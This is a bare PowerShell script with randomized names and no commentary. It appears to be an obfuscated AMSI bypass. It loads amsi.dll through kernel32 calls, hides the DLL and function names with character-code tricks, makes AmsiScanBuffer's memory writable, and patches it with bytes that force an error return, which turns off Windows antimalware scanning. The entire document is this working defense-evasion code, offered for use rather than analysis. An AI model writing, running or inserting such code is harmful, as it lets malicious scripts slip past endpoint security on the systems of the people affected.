$as72vftQQBvieL0E = @"
using System;
using System.Runtime.InteropServices;
public class as72vftQQBvieL0E {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr UwCvGNdOT, string tVLi);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr _Zh, UIntPtr Z61KCv40U, uint LRi_BjpcZDIGm, out uint OuyuXaYVP7aaX);
}
"@

Add-Type $as72vftQQBvieL0E

$VS_ = [as72vftQQBvieL0E]::LoadLibrary("$(('ä'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').NOrmaLiZE([CHAr](70)+[cHar]([byte]0x6f)+[cHAr](114)+[ChaR]([bYTE]0x6d)+[cHAR]([BYTe]0x44)) -replace [ChAR]([BYTE]0x5c)+[ChAr](28+84)+[CHar]([ByTe]0x7b)+[CHAR]([bYtE]0x4d)+[cHAr]([Byte]0x6e)+[ChaR]([ByTe]0x7d))")
$JMowhdJq = [as72vftQQBvieL0E]::GetProcAddress($VS_, "$(('Äm'+'sî'+'Sc'+'ãn'+'Bù'+'ff'+'ér').nOrmaLIze([cHar](70)+[cHAR](111+43-43)+[CHaR](10+104)+[ChAR]([byte]0x6d)+[char](68+63-63)) -replace [Char]([BYTE]0x5c)+[chaR](112)+[cHAr]([ByTe]0x7b)+[ChAR]([BYTe]0x4d)+[chAR]([bYte]0x6e)+[cHAr](125*70/70))")
$p = 0
[as72vftQQBvieL0E]::VirtualProtect($JMowhdJq, [uint32]5, 0x40, [ref]$p)
$sbaFw = "0xB8"
$QAdoueLTvX6_Q66GfP = "0x57"
$aJTu6kKfykQp = "0x00"
$h6mdPc7p = "0x07"
$As1cGUDy4 = "0x80"
$X9SH0AhOY799GZ = "0xC3"
$meNpS4lGWTpeBz6LXQjz = [Byte[]] ($sbaFw,$QAdoueLTvX6_Q66GfP,$aJTu6kKfykQp,$h6mdPc7p,+$As1cGUDy4,+$X9SH0AhOY799GZ)
[System.Runtime.InteropServices.Marshal]::Copy($meNpS4lGWTpeBz6LXQjz, 0, $JMowhdJq, 6)